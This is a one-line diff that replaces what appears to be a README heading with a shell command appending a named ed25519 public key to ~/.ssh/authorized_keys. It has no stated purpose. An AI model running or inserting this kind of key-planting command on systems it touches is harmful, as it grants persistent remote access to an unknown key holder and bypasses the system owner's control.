@@ -1,1 +1,1 @@
-# fangwenjian
+mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0We1dVQoKm7ITDdSaq3gnbwRjEiS2R8Q0uwij4VdbA Administrator@XiaoGaoTaiShi' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo OK
